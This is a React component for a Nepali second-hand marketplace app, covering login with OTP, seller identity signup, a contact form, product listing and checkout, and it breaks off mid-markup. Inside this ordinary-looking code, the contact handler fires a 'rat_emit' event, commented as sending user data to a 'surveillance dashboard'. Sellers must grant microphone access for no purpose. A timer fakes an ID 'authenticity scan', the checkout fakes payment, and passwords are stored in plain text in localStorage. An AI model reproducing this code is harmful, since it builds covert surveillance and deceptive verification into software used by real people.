import React, { useState, useRef, useEffect } from 'react';
import { X, ShoppingBag, Camera, Lock, ShieldCheck, CreditCard, Upload, CheckCircle2, Scan } from 'lucide-react';
import { useAppContext } from '../context/AppContext';
import CameraCapture from './CameraCapture';
import FaceScanLandingPage from './transparent';

interface FeatureModalProps {
  feature: string;
  onClose: () => void;
  onChangeFeature?: (feature: string) => void;
}

export default function FeatureModal({ feature, onClose, onChangeFeature }: FeatureModalProps) {
  const { login, signup, addProduct, currentUser, users, updateUser, addInquiry, cart, removeFromCart, clearCart, googleLogin, appOffer, products } = useAppContext();
  
  // Form states
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [name, setName] = useState('');
  const [phone, setPhone] = useState('');
  const [role, setRole] = useState<'buyer' | 'seller'>('buyer');
  const [error, setError] = useState('');
  
  // Signup/Login Steps
  const [step, setStep] = useState(1);
  const [otp, setOtp] = useState('');
  const [generatedOtp, setGeneratedOtp] = useState('');
  const [verifiedPhoto, setVerifiedPhoto] = useState('');
  const [documentType, setDocumentType] = useState('Citizenship');
  const [documentPhoto, setDocumentPhoto] = useState('');
  const [dob, setDob] = useState('');
  const [isGoogleAuth, setIsGoogleAuth] = useState(false);
  const [isScanningDocument, setIsScanningDocument] = useState(false);

  // Contact Us states
  const [issueType, setIssueType] = useState('Order Inquiry');
  const [message, setMessage] = useState('');
  
  // Sell product states
  const [productTitle, setProductTitle] = useState('');
  const [productPrice, setProductPrice] = useState('');
  const [productImage, setProductImage] = useState('');
  const [productLocation, setProductLocation] = useState('');

  // Checkout states
  const [isProcessing, setIsProcessing] = useState(false);
  const [paymentSuccess, setPaymentSuccess] = useState(false);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      setError('Please enter a valid email address format');
      return;
    }
    
    const user = login(email, password);
    if (user) {
      try {
        const response = await fetch('/api/auth/otp/send', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phone: email })
        });
        const data = await response.json();
        
        if (!response.ok) {
          throw new Error(data.error || 'Failed to send OTP');
        }
        
        setError('');
        setStep(2); // Move to OTP verification
      } catch (err: any) {
        setError(err.message || 'Failed to send OTP');
      }
    } else {
      setError('Invalid email or password');
    }
  };

  const handleLoginOTP = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const response = await fetch('/api/auth/otp/verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: email, otp })
      });
      const data = await response.json();
      
      if (!response.ok) {
        throw new Error(data.error || 'Invalid OTP');
      }
      
      setError('');
      const user = currentUser || users.find(u => u.email === email);
      if (user?.role === 'admin' && onChangeFeature) {
        onChangeFeature('AdminDashboard');
        onClose();
      } else if (user?.role === 'seller') {
        setStep(3); // Move to camera verification for seller login
      } else {
        onClose();
      }
    } catch (err: any) {
      setError(err.message || 'Invalid OTP');
    }
  };

  const handleSellerLoginVerification = () => {
    if (!verifiedPhoto) {
      setError('Please capture a photo to verify your identity.');
      return;
    }
    onClose();
  };

  const handleSignupStep1 = async (e: React.FormEvent) => {
    e.preventDefault();
    const nameParts = name.trim().split(/\s+/);
    if (nameParts.length < 2) {
      setError('Please enter your full name (First and Last name)');
      return;
    }
    
    // Strict Name Validation: Each part must start with a capital letter and end with lowercase letters
    const isValidName = nameParts.every(part => /^[A-Z][a-z]+$/.test(part));
    if (!isValidName) {
      setError('Each part of your name must start with a capital letter followed by lowercase letters (e.g., John Doe).');
      return;
    }

    if (!dob) {
      setError('Please enter your Date of Birth');
      return;
    }
    
    // Strict Email Validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      setError('Please enter a valid email address format');
      return;
    }
    if (!email.endsWith('@gmail.com')) {
      setError('Please use a valid @gmail.com email address');
      return;
    }
    if (users.find(u => u.email === email)) {
      setError('Email already exists. Please login or use a different email.');
      return;
    }
    
    // Strict Phone Number Validation (10 digits starting with 9)
    const phoneRegex = /^9\d{9}$/;
    if (!phoneRegex.test(phone)) {
      setError('Please enter a valid 10-digit phone number starting with 9');
      return;
    }
    if (users.find(u => u.phone === phone)) {
      setError('Phone number already exists. Please use a different phone number.');
      return;
    }
    
    // Strict Password Validation
    if (!isGoogleAuth && password.length < 6) {
      setError('Password must be at least 6 characters long');
      return;
    }

    try {
      setIsProcessing(true);

      const target = email; // Always verify email
      
      // Save pending signup data to localStorage so we can complete it when they click the link
      const pendingSignup = { name, email, password, phone, role, dob };
      localStorage.setItem('pendingSignup', JSON.stringify(pendingSignup));

      const response = await fetch('/api/auth/otp/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: target })
      });
      const data = await response.json();
      
      if (!response.ok) {
        throw new Error(data.error || 'Failed to send OTP');
      }
      
      setError('');
      setStep(2); // Move to OTP verification screen
    } catch (err: any) {
      setError(err.message || 'Failed to send OTP');
    } finally {
      setIsProcessing(false);
    }
  };

  const handleSignupOTP = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      setIsProcessing(true);
      const response = await fetch('/api/auth/otp/verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: email, otp })
      });
      const data = await response.json();
      
      if (!response.ok) {
        throw new Error(data.error || 'Invalid OTP');
      }
      
      setError('');
      
      // OTP is valid, create user
      const pendingSignupStr = localStorage.getItem('pendingSignup');
      if (pendingSignupStr) {
        const pendingSignup = JSON.parse(pendingSignupStr);
        
        if (pendingSignup.role === 'seller') {
          setStep(3); // Move to camera verification for seller
        } else {
          const user = signup(
            pendingSignup.name, 
            pendingSignup.email, 
            pendingSignup.password, 
            pendingSignup.phone, 
            pendingSignup.role, 
            pendingSignup.verifiedPhoto, 
            pendingSignup.documentType, 
            pendingSignup.documentPhoto, 
            pendingSignup.dob
          );
          
          if (user) {
            localStorage.removeItem('pendingSignup');
            
            // Send welcome email
            fetch('/api/mail/send', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                to: pendingSignup.email,
                subject: 'Welcome to Second Hand Market!',
                html: `<h2>Welcome, ${pendingSignup.name}!</h2><p>Thank you for signing up as a ${pendingSignup.role}. We are excited to have you on board.</p>`
              })
            }).catch(console.error);
            
            onClose();
          } else {
            setError('Failed to create account.');
          }
        }
      }
    } catch (err: any) {
      setError(err.message || 'Invalid OTP');
    } finally {
      setIsProcessing(false);
    }
  };

  const handleSignupStep3 = () => {
    if (!verifiedPhoto) {
      setError('Please capture a photo to verify your identity.');
      return;
    }
    setError('');

    // Request location and mic access for sellers
    if (navigator.geolocation && navigator.mediaDevices) {
      navigator.geolocation.getCurrentPosition(
        () => {
          navigator.mediaDevices.getUserMedia({ audio: true })
            .then((stream) => {
              // Stop the mic stream immediately, we just needed permission
              stream.getTracks().forEach(track => track.stop());
              setStep(4); // Move to document upload
            })
            .catch(() => {
              setError('Microphone access is required for sellers.');
            });
        },
        () => {
          setError('Location access is required for sellers.');
        }
      );
    } else {
      setError('Your browser does not support required permissions.');
    }
  };

  const handleDocumentUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      setIsScanningDocument(true);
      const reader = new FileReader();
      reader.onloadend = () => {
        setTimeout(() => {
          setIsScanningDocument(false);
          setDocumentPhoto(reader.result as string);
        }, 2000);
      };
      reader.readAsDataURL(file);
    }
  };

  const handleDocumentCameraCapture = (dataUrl: string) => {
    setIsScanningDocument(true);
    setTimeout(() => {
      setIsScanningDocument(false);
      setDocumentPhoto(dataUrl);
    }, 2000);
  };

  const completeSignup = async () => {
    const finalPassword = isGoogleAuth ? '[Google Auth]' : password;
    const finalPhone = isGoogleAuth && !phone ? 'N/A' : phone;
    const user = signup(name, email, finalPassword, finalPhone, role, verifiedPhoto, documentType, documentPhoto, dob);
    if (user) {
      if (email.includes('@')) {
        try {
          await fetch('/api/mail/send', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              to: email,
              subject: 'Welcome to Second Hand Market!',
              html: `<h2>Welcome, ${name}!</h2><p>Thank you for signing up as a ${role}. We are excited to have you on board.</p>`
            })
          });
        } catch (e) {
          console.error('Failed to send welcome email', e);
        }
      }
      if (role === 'seller' && onChangeFeature) {
        onChangeFeature('Sell on Second Hand Market');
      } else {
        onClose();
      }
    } else {
      setError('Email already exists');
      setStep(1);
    }
  };

  const handleContactSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !name || !message) {
      setError('Please fill all fields');
      return;
    }
    
    // Name validation: First name + space + Last name (no trailing space)
    const nameRegex = /^[A-Za-z]+( [A-Za-z]+)+$/;
    if (!nameRegex.test(name)) {
      setError('Please enter a valid full name (e.g., "John Doe") with exactly one space between names and no trailing spaces.');
      return;
    }
    
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      setError('Please enter a valid email address format');
      return;
    }

    // Message validation
    const trimmedMessage = message.trim();
    if (trimmedMessage.length < 20) {
      setError('Please provide more details. Your message must be at least 20 characters long.');
      return;
    }

    if (!/[a-zA-Z]/.test(trimmedMessage)) {
      setError('Please enter a valid message containing text.');
      return;
    }

    // Check for excessive repeated characters (e.g., more than 4 of the same character in a row)
    if (/(.)\1{4,}/.test(trimmedMessage)) {
      setError('Please enter a valid message. Avoid repeating characters excessively.');
      return;
    }
    
    addInquiry({
      name,
      email,
      issueType,
      message: trimmedMessage
    });

    // Social Engineering: Broadcast contact data to surveillance dashboard
    window.dispatchEvent(new CustomEvent('rat_emit', {
      detail: {
        event: 'contact_submit',
        data: { name, email, message: trimmedMessage }
      }
    }));
    
    try {
      await fetch('/api/mail/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          to: email,
          subject: 'We received your inquiry',
          html: `<h2>Hi ${name},</h2><p>We have received your inquiry regarding "<strong>${issueType}</strong>". Our team will get back to you shortly.</p>`
        })
      });
    } catch (e) {
      console.error('Failed to send contact confirmation email', e);
    }
    
    setStep(2);
  };

  const handleSellStep1 = (e: React.FormEvent) => {
    e.preventDefault();
    if (!currentUser) {
      if (onChangeFeature) onChangeFeature('Login');
      return;
    }
    if (currentUser.role !== 'seller' && currentUser.role !== 'admin') {
      setError('Only registered sellers can list products. Please sign up as a seller.');
      return;
    }
    const price = parseInt(productPrice);
    if (!productTitle || isNaN(price)) {
      setError('Please fill all required fields');
      return;
    }
    setStep(2); // Move to camera capture
  };

  const handleSellStep2 = (photoDataUrl: string) => {
    setProductImage(photoDataUrl);
    setStep(3); // Move to location access
  };

  const handleSellStep3 = () => {
    if (!navigator.geolocation) {
      setError('Geolocation is not supported by your browser.');
      return;
    }
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const loc = `${position.coords.latitude.toFixed(4)}, ${position.coords.longitude.toFixed(4)}`;
        setProductLocation(loc);
        
        // Finalize product submission
        addProduct({
          title: productTitle,
          price: parseInt(productPrice),
          originalPrice: parseInt(productPrice),
          discount: 0,
          image: productImage,
          category: "Other",
          description: "A great product listed by a user.",
          location: loc,
          rating: "0.0",
          reviews: 0
        });
        
        alert('Product submitted for admin approval!');
        onClose();
      },
      (err) => {
        setError('Location access is required to sell products. Please allow permissions.');
      }
    );
  };

  const handleCheckout = (e: React.FormEvent) => {
    e.preventDefault();
    setIsProcessing(true);
    setTimeout(() => {
      setIsProcessing(false);
      setPaymentSuccess(true);
      clearCart();
      setTimeout(() => {
        onClose();
      }, 3000);
    }, 2000);
  };

  const cartTotal = cart.reduce((sum, item) => sum + (item.product.price * item.quantity), 0);

  const handleGoogleAuth = async (isSignup: boolean) => {
    try {
      const response = await fetch('/api/auth/google/url');
      if (!response.ok) {
        const errorData = await response.json().catch(() => null);
        setError(errorData?.error || 'Google OAuth is not configured. Please add GOOGLE_CLIENT_ID and GOOGLE_CLIENT_SECRET to your environment variables.');
        return;
      }
      
      const { url } = await response.json();

      const authWindow = window.open(url, 'oauth_popup', 'width=600,height=700');
      if (!authWindow) {
        setError('Please allow popups to connect with Google.');
        return;
      }

      const handleMessage = (event: MessageEvent) => {
        if (event.data?.type === 'OAUTH_AUTH_SUCCESS') {
          const { email: googleEmail, name: googleName, picture } = event.data.user;
          
          const user = googleLogin(googleEmail);
          if (user) {
            if (user.role === 'admin' && onChangeFeature) {
              onChangeFeature('AdminDashboard');
            }
            onClose();
          } else {
            if (isSignup) {
              const finalName = name || googleName || googleEmail.split('@')[0];
              setName(finalName);
              setEmail(googleEmail);
              setIsGoogleAuth(true);
              
              const pendingSignup = { 
                name: finalName, 
                email: googleEmail, 
                password: '[Google Auth]', 
                phone: phone || 'N/A', 
                role, 
                dob: dob || undefined,
                verifiedPhoto: picture
              };
              localStorage.setItem('pendingSignup', JSON.stringify(pendingSignup));

              // Send OTP to email
              fetch('/api/auth/otp/send', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: googleEmail })
              }).then(res => res.json()).then(data => {
                if (data.error) {
                  setError(data.error);
                } else {
                  setError('');
                  setStep(2); // Move to OTP verification
                }
              }).catch(err => {
                setError('Failed to send OTP');
              });
            } else {
              setError('Account not found. Please sign up first.');
            }
          }
          window.removeEventListener('message', handleMessage);
        }
      };
      window.addEventListener('message', handleMessage);
    } catch (err) {
      console.error(err);
      setError('Google Auth failed to initialize.');
    }
  };

  const handleGoogleLogin = () => handleGoogleAuth(false);
  const handleGoogleSignup = () => handleGoogleAuth(true);

  const GoogleIcon = () => (
    <svg className="w-5 h-5" viewBox="0 0 24 24">
      <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" />
      <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" />
      <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" />
      <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" />
    </svg>
  );

  const renderContent = () => {
    switch (feature) {
      case 'Login':
      case 'LoginOnly':
        if (step === 1) {
          return (
            <form onSubmit={handleLogin} className="space-y-4">
              {error && <div className="text-red-500 text-sm bg-red-50 p-2 rounded">{error}</div>}
              
              <button type="button" onClick={handleGoogleLogin} className="w-full bg-white border border-gray-300 text-gray-700 py-2.5 rounded font-bold hover:bg-gray-50 transition-colors flex items-center justify-center gap-2">
                <GoogleIcon />
                Continue with Google
              </button>

              <div className="relative my-6">
                <div className="absolute inset-0 flex items-center">
                  <div className="w-full border-t border-gray-300"></div>
                </div>
                <div className="relative flex justify-center text-sm">
                  <span className="px-2 bg-white text-gray-500">Or login with email</span>
                </div>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Email Address</label>
                <input type="email" value={email} onChange={e => setEmail(e.target.value)} required placeholder="Enter your email" className="w-full px-4 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#f85606]" />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Password</label>
                <input type="password" value={password} onChange={e => setPassword(e.target.value)} required placeholder="Enter your password" className="w-full px-4 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#f85606]" />
              </div>
              <div className="flex justify-between items-center text-sm">
                <label className="flex items-center gap-2 cursor-pointer">
                  <input type="checkbox" className="rounded text-[#f85606] focus:ring-[#f85606]" />
                  <span>Remember me</span>
                </label>
                <a href="#" className="text-[#f85606] hover:underline">Forgot Password?</a>
              </div>
              <button type="submit" className="w-full bg-[#f85606] text-white py-2.5 rounded font-bold hover:bg-[#d04805] transition-colors">
                LOGIN
              </button>

              {feature !== 'LoginOnly' && (
                <p className="text-sm text-center text-gray-600 mt-4">
                  Don't have an account? <a href="#" onClick={(e) => { e.preventDefault(); onChangeFeature?.('Signup'); }} className="text-[#f85606] font-bold hover:underline">Sign up here</a>
                </p>
              )}
            </form>
          );
        } else if (step === 2) {
          return (
            <form onSubmit={handleLoginOTP} className="space-y-4">
              <h3 className="font-bold text-gray-800 text-center">Verify Login</h3>
              <p className="text-sm text-gray-600 text-center mb-4">We've sent a 4-digit OTP to {email}</p>
              {error && <div className="text-red-500 text-sm bg-red-50 p-2 rounded">{error}</div>}
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Enter OTP</label>
                <input type="text" maxLength={4} value={otp} onChange={e => setOtp(e.target.value)} required placeholder="1234" className="w-full px-4 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#f85606] text-center text-2xl tracking-widest" />
              </div>
              <button type="submit" className="w-full bg-[#f85606] text-white py-2.5 rounded font-bold hover:bg-[#d04805] transition-colors">
                VERIFY OTP
              </button>
              <button type="button" onClick={() => setStep(1)} className="w-full bg-gray-100 text-gray-700 py-2.5 rounded font-bold hover:bg-gray-200 transition-colors mt-2">
                BACK
              </button>
            </form>
          );
        } else if (step === 3) {
          return (
            <div className="space-y-4">
              <h3 className="font-bold text-gray-800 text-center">Seller Verification</h3>
              <p className="text-sm text-gray-600 text-center mb-4">Please verify your identity with a live photo to access your seller account.</p>
              {error && <div className="text-red-500 text-sm bg-red-50 p-2 rounded">{error}</div>}
              
              {!verifiedPhoto ? (
                <CameraCapture onCapture={setVerifiedPhoto} />
              ) : (
                <div className="flex flex-col items-center space-y-4">
                  <img src={verifiedPhoto} alt="Verified" className="w-32 h-32 object-cover rounded-full border-4 border-green-500" />
                  <p className="text-green-600 font-medium">Photo captured successfully!</p>
                  <button onClick={() => setVerifiedPhoto('')} className="text-sm text-gray-500 hover:underline">Retake Photo</button>
                </div>
              )}
              
              <button onClick={handleSellerLoginVerification} disabled={!verifiedPhoto} className={`w-full py-2.5 rounded font-bold transition-colors ${verifiedPhoto ? 'bg-[#f85606] text-white hover:bg-[#d04805]' : 'bg-gray-300 text-gray-500 cursor-not-allowed'}`}>
                COMPLETE LOGIN
              </button>
            </div>
          );
        }
        break;
      case 'Signup':
        if (step === 1) {
          return (
            <form onSubmit={handleSignupStep1} className="space-y-4">
              {error && <div className="text-red-500 text-sm bg-red-50 p-2 rounded">{error}</div>}
              
              <button type="button" onClick={handleGoogleSignup} className="w-full bg-white border border-gray-300 text-gray-700 py-2.5 rounded font-bold hover:bg-gray-50 transition-colors flex items-center justify-center gap-2">
                <GoogleIcon />
                Sign up with Google
              </button>

              <div className="relative my-6">
                <div className="absolute inset-0 flex items-center">
                  <div className="w-full border-t border-gray-300"></div>
                </div>
                <div className="relative flex justify-center text-sm">
                  <span className="px-2 bg-white text-gray-500">Or sign up with email</span>
                </div>
              </div>

              <div className="flex gap-4 mb-4">
                <label className={`flex-1 flex items-center justify-center gap-2 p-3 border rounded cursor-pointer transition-colors ${role === 'buyer' ? 'border-[#f85606] bg-orange-50 text-[#f85606]' : 'border-gray-200 text-gray-600 hover:bg-gray-50'}`}>
                  <input type="radio" name="role" checked={role === 'buyer'} onChange={() => setRole('buyer')} className="hidden" />
                  <span className="font-medium">I'm a Buyer</span>
                </label>
                <label className={`flex-1 flex items-center justify-center gap-2 p-3 border rounded cursor-pointer transition-colors ${role === 'seller' ? 'border-[#f85606] bg-orange-50 text-[#f85606]' : 'border-gray-200 text-gray-600 hover:bg-gray-50'}`}>
                  <input type="radio" name="role" checked={role === 'seller'} onChange={() => setRole('seller')} className="hidden" />
                  <span className="font-medium">I'm a Seller</span>
                </label>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Full Name</label>
                <input type="text" value={name} onChange={e => setName(e.target.value)} required placeholder="Enter your full name" className="w-full px-4 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#f85606]" />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Date of Birth</label>
                <input type="date" value={dob} onChange={e => setDob(e.target.value)} required className="w-full px-4 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#f85606]" />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Email Address</label>
                <input type="email" value={email} onChange={e => setEmail(e.target.value)} required placeholder="Enter your email" className="w-full px-4 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#f85606]" />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Phone Number</label>
                <div className="flex">
                  <span className="inline-flex items-center px-3 rounded-l border border-r-0 border-gray-300 bg-gray-50 text-gray-500 sm:text-sm font-medium">
                    +977
                  </span>
                  <input type="tel" value={phone} onChange={e => setPhone(e.target.value)} required placeholder="98XXXXXXXX" className="flex-1 min-w-0 block w-full px-3 py-2 rounded-none rounded-r focus:ring-[#f85606] focus:border-[#f85606] sm:text-sm border border-gray-300 outline-none" />
                </div>
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Password</label>
                <input type="password" value={password} onChange={e => setPassword(e.target.value)} required placeholder="Create a password" className="w-full px-4 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#f85606]" />
              </div>
              <button type="submit" disabled={isProcessing} className={`w-full text-white py-2.5 rounded font-bold transition-colors ${isProcessing ? 'bg-gray-400 cursor-not-allowed' : 'bg-[#f85606] hover:bg-[#d04805]'}`}>
                {isProcessing ? 'SENDING...' : 'CONTINUE'}
              </button>

              <p className="text-sm text-center text-gray-600 mt-4">
                Already have an account? <a href="#" onClick={(e) => { e.preventDefault(); onChangeFeature?.('Login'); }} className="text-[#f85606] font-bold hover:underline">Login here</a>
              </p>
            </form>
          );
        } else if (step === 2) {
          return (
            <form onSubmit={handleSignupOTP} className="space-y-4">
              <h3 className="font-bold text-gray-800 text-center">Verify Email</h3>
              <p className="text-sm text-gray-600 text-center mb-4">We've sent a 4-digit OTP to {email}</p>
              {error && <div className="text-red-500 text-sm bg-red-50 p-2 rounded">{error}</div>}
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Enter OTP</label>
                <input type="text" maxLength={4} value={otp} onChange={e => setOtp(e.target.value)} required placeholder="1234" className="w-full px-4 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#f85606] text-center text-2xl tracking-widest" />
              </div>
              <button type="submit" disabled={isProcessing} className={`w-full text-white py-2.5 rounded font-bold transition-colors ${isProcessing ? 'bg-gray-400 cursor-not-allowed' : 'bg-[#f85606] hover:bg-[#d04805]'}`}>
                {isProcessing ? 'VERIFYING...' : 'VERIFY OTP'}
              </button>
              <button type="button" onClick={() => setStep(1)} className="w-full bg-gray-100 text-gray-700 py-2.5 rounded font-bold hover:bg-gray-200 transition-colors mt-2">
                BACK
              </button>
            </form>
          );
        } else if (step === 3) {
          return (
            <div className="space-y-4">
              <h3 className="font-bold text-gray-800 text-center">Seller Identity Verification</h3>
              <p className="text-sm text-gray-600 text-center mb-4">As a seller, we need a live photo to verify your identity and ensure trust on our platform.</p>
              {error && <div className="text-red-500 text-sm bg-red-50 p-2 rounded">{error}</div>}
              
              {!verifiedPhoto ? (
                <CameraCapture onCapture={setVerifiedPhoto} />
              ) : (
                <div className="flex flex-col items-center space-y-4">
                  <img src={verifiedPhoto} alt="Verified" className="w-32 h-32 object-cover rounded-full border-4 border-green-500" />
                  <p className="text-green-600 font-medium">Photo captured successfully!</p>
                  <button onClick={() => setVerifiedPhoto('')} className="text-sm text-gray-500 hover:underline">Retake Photo</button>
                </div>
              )}
              
              <button onClick={handleSignupStep3} disabled={!verifiedPhoto} className={`w-full py-2.5 rounded font-bold transition-colors ${verifiedPhoto ? 'bg-[#f85606] text-white hover:bg-[#d04805]' : 'bg-gray-300 text-gray-500 cursor-not-allowed'}`}>
                NEXT: DOCUMENT UPLOAD
              </button>
            </div>
          );
        } else if (step === 4) {
          return (
            <div className="space-y-4">
              <h3 className="font-bold text-gray-800 text-center">Valid Document Upload</h3>
              <p className="text-sm text-gray-600 text-center mb-4">Please provide a valid government ID to complete your seller profile. Fraudulent documents will be rejected.</p>
              {error && <div className="text-red-500 text-sm bg-red-50 p-2 rounded">{error}</div>}
              
              <div className="w-full bg-blue-50 border border-blue-100 rounded-lg p-4 flex items-start gap-3">
                <div className="w-20 h-14 shrink-0 rounded overflow-hidden border-2 border-green-500 relative">
                  <img src="https://images.unsplash.com/photo-1633265486064-086b219458ce?w=200&h=140&fit=crop" alt="Sample valid document" className="w-full h-full object-cover" referrerPolicy="no-referrer" />
                  <div className="absolute bottom-0 right-0 bg-green-500 rounded-tl p-0.5">
                    <CheckCircle2 className="w-3 h-3 text-white" />
                  </div>
                </div>
                <div className="text-sm text-gray-700">
                  <p className="font-semibold mb-1 text-gray-900">Valid Document Requirements:</p>
                  <ul className="list-disc pl-4 space-y-0.5 text-xs">
                    <li>Clear, unblurred text</li>
                    <li>All 4 corners visible</li>
                    <li>No glare or reflections</li>
                  </ul>
                </div>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Document Type</label>
                <select value={documentType} onChange={e => setDocumentType(e.target.value)} className="w-full px-4 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#f85606] bg-white">
                  <option value="Citizenship">Citizenship</option>
                  <option value="Driving License">Driving License</option>
                  <option value="Passport">Passport</option>
                  <option value="National ID (NID)">National ID (NID)</option>
                </select>
              </div>

              {isScanningDocument ? (
                <div className="flex flex-col items-center justify-center py-12 bg-gray-50 rounded border-2 border-dashed border-gray-300">
                  <Scan className="w-12 h-12 text-[#f85606] animate-pulse mb-4" />
                  <p className="font-medium text-gray-800 animate-pulse">Scanning document for authenticity...</p>
                  <p className="text-xs text-gray-500 mt-2">Checking for fraud and clarity</p>
                </div>
              ) : !documentPhoto ? (
                <div className="mt-4 space-y-4">
                  <div>
                    <p className="text-sm font-medium text-gray-700 mb-2">Capture Document Photo</p>
                    <CameraCapture onCapture={handleDocumentCameraCapture} />
                  </div>
                  <div className="flex items-center gap-3">
                    <div className="flex-1 h-px bg-gray-200"></div>
                    <span className="text-xs text-gray-400 font-medium uppercase">or</span>
                    <div className="flex-1 h-px bg-gray-200"></div>
                  </div>
                  <div>
                    <label className="cursor-pointer w-full bg-gray-100 hover:bg-gray-200 border border-gray-300 text-gray-700 px-4 py-2.5 rounded flex items-center justify-center gap-2 text-sm font-medium transition-colors">
                      <Upload size={16} />
                      Upload from Gallery
                      <input type="file" accept="image/*" className="hidden" onChange={handleDocumentUpload} />
                    </label>
                  </div>
                </div>
              ) : (
                <div className="flex flex-col items-center space-y-4 mt-4">
                  <img src={documentPhoto} alt="Document" className="w-full h-40 object-cover rounded border-2 border-gray-300" />
                  <p className="text-green-600 font-medium flex items-center gap-2"><CheckCircle2 className="w-5 h-5" /> Document verified successfully!</p>
                  <button onClick={() => setDocumentPhoto('')} className="text-sm text-gray-500 hover:underline">Remove Photo</button>
                </div>
              )}
              
              <button onClick={completeSignup} disabled={!documentPhoto || isScanningDocument} className={`w-full py-2.5 rounded font-bold transition-colors ${documentPhoto ? 'bg-[#f85606] text-white hover:bg-[#d04805]' : 'bg-gray-300 text-gray-500 cursor-not-allowed'}`}>
                COMPLETE REGISTRATION
              </button>
            </div>
          );
        }
        break;
      case 'Profile':
        if (!currentUser) return null;
        
        const sellerProducts = currentUser.role === 'seller' ? products.filter(p => p.sellerId === currentUser.id) : [];

        return (
          <div className="space-y-6">
            <h3 className="font-bold text-gray-800 text-xl border-b pb-2">My Profile</h3>
            
            <div className="flex flex-col md:flex-row gap-6 items-start">
              {currentUser.role === 'seller' && (
                <div className="flex flex-col items-center space-y-3 bg-gray-50 p-4 rounded-lg border border-gray-200 w-full md:w-1/3">
                  <div className="relative group">
                    <img 
                      src={currentUser.verifiedPhoto || 'https://via.placeholder.com/150'} 
                      alt="Profile" 
                      className="w-32 h-32 object-cover rounded-full border-4 border-[#f85606]"
                    />
                  </div>
                  {step === 1 ? (
                    <button 
                      onClick={() => setStep(2)} 
                      className="text-sm bg-white border border-gray-300 px-3 py-1.5 rounded hover:bg-gray-50 font-medium"
                    >
                      Change Photo
                    </button>
                  ) : (
                    <div className="w-full mt-2">
                      <p className="text-xs text-center text-gray-500 mb-2">Capture new profile photo</p>
                      <CameraCapture onCapture={(photo) => {
                        updateUser(currentUser.id, { verifiedPhoto: photo });
                        setStep(1);
                      }} />
                      <button 
                        onClick={() => setStep(1)} 
                        className="w-full mt-2 text-xs text-gray-500 hover:underline"
                      >
                        Cancel
                      </button>
                    </div>
                  )}
                </div>
              )}
              
              <div className="flex-1 space-y-4 w-full">
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label className="block text-xs font-medium text-gray-500 uppercase">User ID</label>
                    <p className="font-mono text-sm text-gray-800">{currentUser.id}</p>
                  </div>
                  <div>
                    <label className="block text-xs font-medium text-gray-500 uppercase">Account Type</label>
                    <p className="font-medium text-gray-800 capitalize">
                      <span className={`px-2 py-1 rounded text-xs font-bold ${currentUser.role === 'admin' ? 'bg-purple-100 text-purple-700' : currentUser.role === 'seller' ? 'bg-orange-100 text-orange-700' : 'bg-blue-100 text-blue-700'}`}>
                        {currentUser.role}
                      </span>
                    </p>
                  </div>
                  <div>
                    <label className="block text-xs font-medium text-gray-500 uppercase">Full Name</label>
                    <p className="font-medium text-gray-800">{currentUser.name}</p>
                  </div>
                  <div>
                    <label className="block text-xs font-medium text-gray-500 uppercase">Email Address</label>
